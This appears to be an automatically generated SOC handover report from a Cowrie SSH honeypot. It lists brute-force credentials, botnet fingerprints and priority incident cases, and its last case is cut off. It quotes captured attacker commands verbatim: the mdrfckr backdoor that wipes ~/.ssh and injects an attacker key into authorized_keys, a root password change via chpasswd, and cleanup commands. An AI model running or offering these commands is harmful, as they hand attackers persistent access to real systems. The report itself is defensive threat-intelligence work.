# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-15 |
| **Generated At** | 2026-06-15T12:23:40Z |
| **Shift Time** | 12:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **346** |
| Confirmed Threats | **221** |
| False Positives Filtered | **125** (36.1%) |
| Unique Attacker IPs | **69** |
| Countries of Origin | **28** |
| High Severity Cases | **57** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **289** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **184** |
| Unique Credential Pairs | **137** |
| Unique Usernames | **77** |
| Unique Passwords | **112** |
| Successful Auth Pairs | **46** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 57 |
| `345gs5662d34` | 23 |
| `ubuntu` | 5 |
| `admin` | 4 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 23 |
| `123` | 10 |
| `123456` | 9 |
| `password` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `Windows10` | 2 |
| `mega` | `123` | 2 |
| `frappe` | `frappe` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Windows10` | `45.127.34.106` | 2026-06-15T05:24:06 |
| `root` | `3245gs5662d34` | `45.127.34.106` | 2026-06-15T05:24:08 |
| `root` | `2026.com` | `190.181.44.194` | 2026-06-15T05:29:44 |
| `root` | `3245gs5662d34` | `190.181.44.194` | 2026-06-15T05:29:52 |
| `root` | `Pass1234` | `103.183.62.1` | 2026-06-15T05:36:23 |
| `root` | `3245gs5662d34` | `103.183.62.2` | 2026-06-15T05:36:26 |
| `root` | `Sw.123456` | `103.183.62.1` | 2026-06-15T05:38:37 |
| `root` | `3245gs5662d34` | `103.183.62.1` | 2026-06-15T05:38:40 |
| `root` | `ita` | `103.183.62.1` | 2026-06-15T05:47:26 |
| `root` | `ABCabc` | `103.183.62.1` | 2026-06-15T05:55:31 |
| `root` | `a123456a` | `103.183.62.2` | 2026-06-15T05:58:12 |
| `root` | `3245gs5662d34` | `103.183.62.0` | 2026-06-15T05:58:14 |
| `root` | `Windows10` | `103.183.62.1` | 2026-06-15T06:00:48 |
| `root` | `A12345678` | `103.183.62.1` | 2026-06-15T06:05:33 |
| `root` | `@Aa123456789` | `167.99.148.102` | 2026-06-15T06:55:52 |
| `root` | `3245gs5662d34` | `167.99.148.102` | 2026-06-15T06:55:57 |
| `root` | `qwe123!@` | `219.128.75.174` | 2026-06-15T07:28:08 |
| `root` | `3245gs5662d34` | `219.128.75.174` | 2026-06-15T07:28:11 |
| `root` | `Support@2025` | `103.172.20.218` | 2026-06-15T07:35:10 |
| `root` | `3245gs5662d34` | `103.172.20.218` | 2026-06-15T07:35:15 |
| `root` | `!@#123qweQWE` | `47.242.105.190` | 2026-06-15T07:50:48 |
| `root` | `3245gs5662d34` | `47.242.105.190` | 2026-06-15T07:50:51 |
| `root` | `!QA2ws3ed` | `47.242.105.190` | 2026-06-15T07:54:59 |
| `root` | `Yt@123456` | `47.242.105.190` | 2026-06-15T07:58:43 |
| `root` | `AA123456..` | `47.242.105.190` | 2026-06-15T07:59:28 |
| `root` | `2wsx3EDC` | `47.242.105.190` | 2026-06-15T08:00:12 |
| `root` | `Aa159357` | `47.242.105.190` | 2026-06-15T08:02:57 |
| `root` | `nE7jAInvalid` | `47.242.105.190` | 2026-06-15T08:06:52 |
| `root` | `a123456!!!` | `47.242.105.190` | 2026-06-15T08:08:20 |
| `root` | `Pa$$w0rd2024` | `4.240.82.91` | 2026-06-15T10:15:40 |
| `root` | `3245gs5662d34` | `4.240.82.91` | 2026-06-15T10:15:55 |
| `root` | `aa123456` | `91.92.40.151` | 2026-06-15T10:36:37 |
| `root` | `QWEqwe123` | `91.92.40.151` | 2026-06-15T10:37:25 |
| `root` | `123123` | `91.92.40.151` | 2026-06-15T10:37:54 |
| `root` | `741852963` | `91.92.40.151` | 2026-06-15T10:38:42 |
| `root` | `qwe123456` | `91.92.40.151` | 2026-06-15T10:39:23 |
| `root` | `Password1` | `91.92.40.151` | 2026-06-15T10:40:29 |
| `root` | `zaq12wsx` | `91.92.40.151` | 2026-06-15T10:41:04 |
| `root` | `qq123456` | `91.92.40.151` | 2026-06-15T10:41:21 |
| `root` | `AA123456` | `91.92.40.151` | 2026-06-15T10:42:14 |
| `root` | `1q2w3e4r` | `91.92.40.151` | 2026-06-15T10:42:44 |
| `root` | `metalica` | `135.235.138.43` | 2026-06-15T11:22:39 |
| `root` | `3245gs5662d34` | `135.235.138.43` | 2026-06-15T11:22:41 |
| `root` | `123qweAsd` | `61.76.38.54` | 2026-06-15T11:22:52 |
| `root` | `3245gs5662d34` | `61.76.38.54` | 2026-06-15T11:22:56 |
| `root` | `123456789010` | `135.235.138.43` | 2026-06-15T11:27:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **346** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 123 |
| Go SSH scanner | 69 |
| Unknown | 2 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 118 | 20 |
| `0a07365cc01f...` | Generic scanner | 64 | 1 |
| `e37f354a101a...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |
| `16443846184e...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 118 | 20 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 64 | 1 | Generic scanner |
| `e37f354a101a...` | libssh | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `ec9ea89c70f5...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Z5C0eEAtDNGv"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `135.235.138.43`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `190.181.44.194`, `167.99.148.102`, `45.127.34.106`, `219.128.75.174`, `103.172.20.218`, `103.183.62.1`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **69** |
| Unique ASNs | **43** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 11 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS149636` | Hasan Broadband Net | 3 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 3 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (57)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8fa3dca64cdb

| Field | Detail |
|---|---|
| **Source IP** | `45.127.34[.]106` |
| **First Seen** | 2026-06-15 05:24 |
| **Last Seen** | 2026-06-15 05:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:24:06` | `cowrie.session.connect` |
| `2026-06-15 05:24:06` | `cowrie.client.version` |
| `2026-06-15 05:24:06` | `cowrie.client.kex` |
| `2026-06-15 05:24:06` | `cowrie.login.success` |
| `2026-06-15 05:24:06` | `cowrie.session.params` |
| `2026-06-15 05:24:06` | `cowrie.command.input` |
| `2026-06-15 05:24:06` | `cowrie.command.failed` |
| `2026-06-15 05:24:06` | `cowrie.log.closed` |
| `2026-06-15 05:24:06` | `cowrie.session.params` |
| `2026-06-15 05:24:06` | `cowrie.command.input` |
| `2026-06-15 05:24:07` | `cowrie.session.file_download` |
| `2026-06-15 05:24:07` | `cowrie.log.closed` |
| `2026-06-15 05:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.127.34[.]106` to AbuseIPDB if not already reported
- [ ] Block `45.127.34[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51efebc85545

| Field | Detail |
|---|---|
| **Source IP** | `45.127.34[.]106` |
| **First Seen** | 2026-06-15 05:24 |
| **Last Seen** | 2026-06-15 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:24:08` | `cowrie.session.connect` |
| `2026-06-15 05:24:08` | `cowrie.client.version` |
| `2026-06-15 05:24:08` | `cowrie.client.kex` |
| `2026-06-15 05:24:08` | `cowrie.login.success` |
| `2026-06-15 05:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.127.34[.]106` to AbuseIPDB if not already reported
- [ ] Block `45.127.34[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f270904ecc

| Field | Detail |
|---|---|
| **Source IP** | `190.181.44[.]194` |
| **First Seen** | 2026-06-15 05:29 |
| **Last Seen** | 2026-06-15 05:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:29:42` | `cowrie.session.connect` |
| `2026-06-15 05:29:42` | `cowrie.client.version` |
| `2026-06-15 05:29:43` | `cowrie.client.kex` |
| `2026-06-15 05:29:44` | `cowrie.login.success` |
| `2026-06-15 05:29:45` | `cowrie.session.params` |
| `2026-06-15 05:29:45` | `cowrie.command.input` |
| `2026-06-15 05:29:45` | `cowrie.command.failed` |
| `2026-06-15 05:29:46` | `cowrie.log.closed` |
| `2026-06-15 05:29:46` | `cowrie.session.params` |
| `2026-06-15 05:29:46` | `cowrie.command.input` |
| `2026-06-15 05:29:46` | `cowrie.session.file_download` |
| `2026-06-15 05:29:46` | `cowrie.log.closed` |
| `2026-06-15 05:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.44[.]194` to AbuseIPDB if not already reported
- [ ] Block `190.181.44[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3822845713

| Field | Detail |
|---|---|
| **Source IP** | `190.181.44[.]194` |
| **First Seen** | 2026-06-15 05:29 |
| **Last Seen** | 2026-06-15 05:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:29:50` | `cowrie.session.connect` |
| `2026-06-15 05:29:50` | `cowrie.client.version` |
| `2026-06-15 05:29:50` | `cowrie.client.kex` |
| `2026-06-15 05:29:52` | `cowrie.login.success` |
| `2026-06-15 05:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.44[.]194` to AbuseIPDB if not already reported
- [ ] Block `190.181.44[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6990485012a

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:36 |
| **Last Seen** | 2026-06-15 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:36:23` | `cowrie.session.connect` |
| `2026-06-15 05:36:23` | `cowrie.client.version` |
| `2026-06-15 05:36:23` | `cowrie.client.kex` |
| `2026-06-15 05:36:23` | `cowrie.login.success` |
| `2026-06-15 05:36:24` | `cowrie.session.params` |
| `2026-06-15 05:36:24` | `cowrie.command.input` |
| `2026-06-15 05:36:24` | `cowrie.command.failed` |
| `2026-06-15 05:36:24` | `cowrie.log.closed` |
| `2026-06-15 05:36:24` | `cowrie.session.params` |
| `2026-06-15 05:36:24` | `cowrie.command.input` |
| `2026-06-15 05:36:24` | `cowrie.session.file_download` |
| `2026-06-15 05:36:24` | `cowrie.log.closed` |
| `2026-06-15 05:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b2c9bb9c54c

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]2` |
| **First Seen** | 2026-06-15 05:36 |
| **Last Seen** | 2026-06-15 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:36:26` | `cowrie.session.connect` |
| `2026-06-15 05:36:26` | `cowrie.client.version` |
| `2026-06-15 05:36:26` | `cowrie.client.kex` |
| `2026-06-15 05:36:26` | `cowrie.login.success` |
| `2026-06-15 05:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-254aab90393f

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:38 |
| **Last Seen** | 2026-06-15 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:38:37` | `cowrie.session.connect` |
| `2026-06-15 05:38:37` | `cowrie.client.version` |
| `2026-06-15 05:38:37` | `cowrie.client.kex` |
| `2026-06-15 05:38:37` | `cowrie.login.success` |
| `2026-06-15 05:38:37` | `cowrie.session.params` |
| `2026-06-15 05:38:37` | `cowrie.command.input` |
| `2026-06-15 05:38:37` | `cowrie.command.failed` |
| `2026-06-15 05:38:38` | `cowrie.log.closed` |
| `2026-06-15 05:38:38` | `cowrie.session.params` |
| `2026-06-15 05:38:38` | `cowrie.command.input` |
| `2026-06-15 05:38:38` | `cowrie.session.file_download` |
| `2026-06-15 05:38:38` | `cowrie.log.closed` |
| `2026-06-15 05:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a87a0394afc

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:38 |
| **Last Seen** | 2026-06-15 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:38:40` | `cowrie.session.connect` |
| `2026-06-15 05:38:40` | `cowrie.client.version` |
| `2026-06-15 05:38:40` | `cowrie.client.kex` |
| `2026-06-15 05:38:40` | `cowrie.login.success` |
| `2026-06-15 05:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca32304fc98

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:47 |
| **Last Seen** | 2026-06-15 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:47:25` | `cowrie.session.connect` |
| `2026-06-15 05:47:25` | `cowrie.client.version` |
| `2026-06-15 05:47:25` | `cowrie.client.kex` |
| `2026-06-15 05:47:26` | `cowrie.login.success` |
| `2026-06-15 05:47:26` | `cowrie.session.params` |
| `2026-06-15 05:47:26` | `cowrie.command.input` |
| `2026-06-15 05:47:26` | `cowrie.command.failed` |
| `2026-06-15 05:47:26` | `cowrie.log.closed` |
| `2026-06-15 05:47:26` | `cowrie.session.params` |
| `2026-06-15 05:47:26` | `cowrie.command.input` |
| `2026-06-15 05:47:26` | `cowrie.session.file_download` |
| `2026-06-15 05:47:26` | `cowrie.log.closed` |
| `2026-06-15 05:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc051fb92051

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:47 |
| **Last Seen** | 2026-06-15 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:47:28` | `cowrie.session.connect` |
| `2026-06-15 05:47:28` | `cowrie.client.version` |
| `2026-06-15 05:47:28` | `cowrie.client.kex` |
| `2026-06-15 05:47:28` | `cowrie.login.success` |
| `2026-06-15 05:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4156fcb554de

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 05:55 |
| **Last Seen** | 2026-06-15 05:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
